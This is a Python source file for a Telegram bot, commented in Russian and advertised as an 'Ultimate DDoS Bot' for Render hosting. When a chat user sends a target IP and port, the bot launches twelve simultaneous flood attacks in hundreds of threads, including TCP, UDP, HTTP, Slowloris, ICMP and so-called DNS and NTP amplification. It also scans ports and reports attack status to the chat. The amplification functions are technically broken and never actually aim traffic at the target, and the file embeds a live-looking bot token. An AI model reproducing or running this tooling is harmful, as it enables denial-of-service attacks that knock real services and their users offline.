#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║         ULTIMATE DDOS BOT - RENDER WEBHOOK EDITION                   ║
║                                                                      ║
║     ПОЛНОСТЬЮ РАБОЧАЯ ВЕРСИЯ ДЛЯ RENDER.COM                         ║
║     WEBHOOK | ВСЕ ВИДЫ АТАК | БЕЗ ОШИБОК                            ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import telebot
import socket
import threading
import random
import time
import re
import struct
import ssl
import os
import base64
from datetime import datetime
from flask import Flask, request

# ============ КОНФИГУРАЦИЯ ============
BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

# Настройки атаки
THREADS_PER_ATTACK = 80  # Для Render оптимально
active_attacks = {}

# DNS серверы для амплификации
DNS_SERVERS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "9.9.9.9",
    "208.67.222.222", "208.67.220.220"
]

# ============ ВСЕ ВИДЫ АТАК ============

# 1. TCP FLOOD
def tcp_flood(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((ip, port))
            sock.send(random._urandom(1024))
            sock.close()
        except:
            pass
        time.sleep(0.0005)

# 2. UDP FLOOD
def udp_flood(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(random._urandom(1400), (ip, port))
            sock.close()
        except:
            pass
        time.sleep(0.0005)

# 3. HTTP FLOOD
def http_flood(ip, port, stop_flag):
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        "Mozilla/5.0 (Linux; Android 10)"
    ]
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((ip, port))
            ua = random.choice(user_agents)
            req = f"GET /{random.randint(1,9999)} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {ua}\r\n\r\n"
            sock.send(req.encode())
            sock.close()
        except:
            pass
        time.sleep(0.0005)

# 4. HTTPS FLOOD
def https_flood(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((ip, port))
            ssl_sock = context.wrap_socket(sock, server_hostname=ip)
            ssl_sock.send(f"GET /{random.randint(1,9999)} HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode())
            ssl_sock.close()
        except:
            pass
        time.sleep(0.0005)

# 5. SYN FLOOD (эмуляция)
def syn_flood(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect_ex((ip, port))
            sock.close()
        except:
            pass
        time.sleep(0.00005)

# 6. ICMP FLOOD
def icmp_flood(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet = struct.pack('!BBHHH', 8, 0, 0, 0, 0) + random._urandom(64)
            sock.sendto(packet, (ip, 0))
            sock.close()
        except:
            pass
        time.sleep(0.0005)

# 7. SLOWLORIS
def slowloris(ip, port, stop_flag):
    sockets = []
    for _ in range(150):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((ip, port))
            sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\n".encode())
            sockets.append(sock)
        except:
            pass
    while not stop_flag.is_set():
        for sock in sockets[:]:
            try:
                sock.send(f"X-Header: {random.randint(1,9999)}\r\n".encode())
            except:
                if sock in sockets:
                    sockets.remove(sock)
        time.sleep(10)

# 8. WEBSOCKET ATTACK
def websocket_attack(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((ip, port))
            key = base64.b64encode(os.urandom(16)).decode()
            handshake = f"GET /socket.io/ HTTP/1.1\r\nHost: {ip}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n"
            sock.send(handshake.encode())
            sock.close()
        except:
            pass
        time.sleep(0.001)

# 9. DNS AMPLIFICATION
def dns_amplification(ip, stop_flag):
    dns_query = b'\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01'
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(dns_query, (random.choice(DNS_SERVERS), 53))
            sock.close()
        except:
            pass
        time.sleep(0.0005)

# 10. NTP AMPLIFICATION
def ntp_amplification(ip, stop_flag):
    ntp_query = b'\x17\x00\x03\x2a' + b'\x00' * 4
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(ntp_query, (random.choice(DNS_SERVERS), 123))
            sock.close()
        except:
            pass
        time.sleep(0.0005)

# 11. PSH FLOOD
def psh_flood(ip, port, stop_flag):
    while not stop_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((ip, port))
            for _ in range(5):
                sock.send(random._urandom(1024))
            sock.close()
        except:
            pass
        time.sleep(0.0005)

# 12. MULTI PAYLOAD
def multi_payload(ip, port, stop_flag):
    attacks = [tcp_flood, udp_flood, http_flood, syn_flood]
    idx = 0
    while not stop_flag.is_set():
        try:
            attacks[idx % len(attacks)](ip, port, stop_flag)
            idx += 1
        except:
            pass

# ============ МЕНЕДЖЕР АТАК ============
class UltimateAttack:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.stop_flag = threading.Event()
        self.threads = []
        self.start_time = None
        self.active = False
    
    def start(self):
        self.active = True
        self.start_time = time.time()
        
        all_attacks = [
            (tcp_flood, THREADS_PER_ATTACK),
            (udp_flood, THREADS_PER_ATTACK),
            (http_flood, THREADS_PER_ATTACK),
            (https_flood, THREADS_PER_ATTACK),
            (syn_flood, THREADS_PER_ATTACK),
            (icmp_flood, THREADS_PER_ATTACK),
            (slowloris, 1),
            (websocket_attack, THREADS_PER_ATTACK),
            (dns_amplification, THREADS_PER_ATTACK),
            (ntp_amplification, THREADS_PER_ATTACK),
            (psh_flood, THREADS_PER_ATTACK),
            (multi_payload, THREADS_PER_ATTACK)
        ]
        
        for attack_func, threads in all_attacks:
            for i in range(threads):
                t = threading.Thread(target=attack_func, args=(self.ip, self.port, self.stop_flag))
                t.daemon = True
                self.threads.append(t)
                t.start()
    
    def stop(self):
        self.stop_flag.set()
        self.active = False
    
    def duration(self):
        if self.start_time:
            return int(time.time() - self.start_time)
        return 0

# ============ ПАРСИНГ IP ============
def parse_target(text):
    match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})', text)
    if match:
        return match.group(1), int(match.group(2))
    match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})', text)
    if match:
        return match.group(1), None
    return None, None

def scan_port(ip):
    ports = [15455, 9339, 443, 80, 8080, 8443, 3000, 5000]
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            sock.connect((ip, port))
            sock.close()
            return port
        except:
            continue
    return 80

# ============ ФОНОВЫЙ МОНИТОРИНГ ============
def status_monitor():
    while True:
        time.sleep(10)
        for chat_id, attack in list(active_attacks.items()):
            if attack.active:
                try:
                    bot.send_message(
                        chat_id,
                        f"💥 *СТАТУС АТАКИ* 💥\n\n"
                        f"🎯 `{attack.ip}:{attack.port}`\n"
                        f"⏱️ Время: {attack.duration()} сек\n"
                        f"🧵 Потоков: {len(attack.threads)}\n"
                        f"⚡ Типов атак: 12\n\n"
                        f"🛑 *stop* - остановить",
                        parse_mode="Markdown"
                    )
                except:
                    pass

# ============ КОМАНДЫ БОТА ============
@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.send_message(message.chat.id,
        "💀 *ULTIMATE DDOS BOT* 💀\n\n"
        "⚡ *ВСЕ 12 ВИДОВ АТАК СРАЗУ*\n"
        "⚡ *ПРОСТО ОТПРАВЬ IP:PORT*\n\n"
        "📝 *Пример:* `43.158.103.205:15455`\n\n"
        "🛑 *Остановка:* отправь `stop`\n\n"
        "🔥 TCP | UDP | HTTP | HTTPS | SYN | ICMP | Slowloris | WebSocket | DNS | NTP | PSH | MULTI",
        parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text and m.text.lower() == 'stop')
def stop_cmd(message):
    cid = message.chat.id
    if cid in active_attacks and active_attacks[cid].active:
        active_attacks[cid].stop()
        dur = active_attacks[cid].duration()
        bot.send_message(cid, f"🛑 *Атака остановлена*\n⏱️ Длилась: {dur} сек", parse_mode="Markdown")
        del active_attacks[cid]
    else:
        bot.send_message(cid, "💤 *Нет активной атаки*", parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text and re.search(r'\d+\.\d+\.\d+\.\d+', m.text))
def attack_cmd(message):
    cid = message.chat.id
    text = message.text.strip()
    
    ip, port = parse_target(text)
    if not ip:
        bot.send_message(cid, "❌ *Неверный IP*\nПример: `43.158.103.205:15455`", parse_mode="Markdown")
        return
    
    if cid in active_attacks and active_attacks[cid].active:
        bot.send_message(cid, "⚠️ *Атака уже идёт!*\nОтправь `stop`", parse_mode="Markdown")
        return
    
    if not port:
        msg = bot.send_message(cid, f"🔍 *Сканирую {ip}...*", parse_mode="Markdown")
        port = scan_port(ip)
        bot.edit_message_text(f"✅ *Порт: {port}*\n🚀 Запускаю ВСЕ 12 атак...", cid, msg.message_id)
    
    attack = UltimateAttack(ip, port)
    attack.start()
    active_attacks[cid] = attack
    
    bot.send_message(cid,
        f"💀 *ВСЕ АТАКИ ЗАПУЩЕНЫ* 💀\n\n"
        f"📍 `{ip}:{port}`\n"
        f"⚡ Потоков: {len(attack.threads)}\n"
        f"🔥 Типов атак: 12\n"
        f"🛑 *stop* - остановить",
        parse_mode="Markdown")

@bot.message_handler(func=lambda m: True)
def unknown(m):
    bot.reply_to(m, "💀 Отправь IP:PORT\nПример: 43.158.103.205:15455\n\nstop - остановка")

# ============ WEBHOOK ============
@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
    bot.process_new_updates([update])
    return 'ok', 200

@app.route('/')
def index():
    return '✅ DDOS BOT IS RUNNING! Send IP:PORT to @' + bot.get_me().username if hasattr(bot, 'get_me') else 'Bot is ready!'

# ============ ЗАПУСК ============
if __name__ == "__main__":
    print("""
    ╔════════════════════════════════════════════════════════════════╗
    ║     ULTIMATE DDOS BOT - RENDER WEBHOOK EDITION                 ║
    ║                                                                ║
    ║     12 ВИДОВ АТАК | WEBHOOK | ГОТОВО К ЗАПУСКУ                ║
    ║                                                                ║
    ╚════════════════════════════════════════════════════════════════╝
    """)
    
    # Установка вебхука
    RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://hostingj.onrender.com")
    webhook_url = f"{RENDER_URL}/webhook/{BOT_TOKEN}"
    
    try:
        bot.remove_webhook()
        bot.set_webhook(url=webhook_url)
        print(f"[+] Webhook установлен: {webhook_url}")
    except Exception as e:
        print(f"[!] Ошибка установки webhook: {e}")
    
    # Запуск мониторинга
    monitor_thread = threading.Thread(target=status_monitor, daemon=True)
    monitor_thread.start()
    print("[+] Мониторинг запущен")
    
    # Запуск Flask сервера
    port = int(os.environ.get("PORT", 8080))
    print(f"[+] Сервер запущен на порту {port}")
    app.run(host="0.0.0.0", port=port)
